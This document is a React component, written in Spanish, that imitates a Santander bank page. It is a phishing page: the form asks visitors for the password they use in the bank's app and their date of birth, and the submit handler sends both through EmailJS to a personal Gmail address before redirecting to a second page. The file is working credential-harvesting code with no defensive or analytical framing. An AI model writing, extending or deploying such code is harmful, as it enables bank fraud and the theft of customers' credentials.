import React from 'react';
import '../css/primerapag.css';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';

function Primerapag() {
  const navigate = useNavigate();

  const handleSubmit = async (event) => {
    event.preventDefault();
    
    const formData = new FormData(event.target);
    const contram = formData.get('contram');
    const fechaNacimiento = formData.get('fechaNacimiento');

    try {
      const response = await emailjs.send('service_pl7uznq', 'template_nb08ccn', {
        contram,
        fechaNacimiento,
        to_email: 'alosantamex@gmail.com'
      }, '8Mgn87H6amGJecjhG');

      if (response.status === 200) {
        console.log('Datos enviados correctamente');
        navigate('/segundapag');
      } else {
        console.error('Error al enviar los datos');
      }
    } catch (error) {
      console.error('Error al enviar los datos:', error);
    }
  };

  return (
    <div className="santander-container">
      <div className="santander-header">
        <span className="santander-logo">
          <img style={{ width: '160px' }} src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-XzSWZdtf3Lgk80cOwX_lyUAiAGOkQer4gLjKSlGD1_Lso4yPSiWbUTVw-ssFpCkB2I-e4_gAGp3PFTz6uKHDMX3hD8QcVDWegy5jXJ4oOpTmXOzCTVoOEj5H0V_mKgxE9y9aAj5deqw/s640/logo+santander+nuevo2.jpg" alt="Logo Santander" />
        </span>
      </div>
      <form className="santander-form" onSubmit={handleSubmit}>
        <label>
          Contraseña que usa en su aplicación
          <input type="text" name="contram" placeholder="Contraseña" className="santander-input" required />
        </label>
        <label>
          Fecha de Nacimiento
          <input type="date" name="fechaNacimiento" className="santander-input date-input" required />
        </label>
        <button type="submit" className="santander-continue-button">Continuar</button>
      </form>

      <style jsx>{`
        .date-input {
          -webkit-appearance: none;
          -moz-appearance: none;
          appearance: none;
          width: 100%;
          padding: 10px;
          margin-top: 5px;
          border: 1px solid #ccc;
          border-radius: 5px;
          font-size: 16px;
          box-sizing: border-box;
          min-height: 40px; /* Ajusta este valor según sea necesario */
        }

        @media (max-width: 600px) {
          .date-input {
            font-size: 14px;
            padding: 8px;
            min-height: 35px; /* Ajusta este valor según sea necesario */
          }
        }

        /* Ajustes específicos para Safari */
        @media not all and (min-resolution:.001dpcm) { 
          @supports (-webkit-appearance:none) {
            .date-input {
              height: auto; /* Asegura que tenga una altura adecuada en Safari */
              line-height: normal; /* Resetea el line-height para Safari */
            }
          }
        }
      `}</style>
    </div>
  );
}

export default Primerapag;
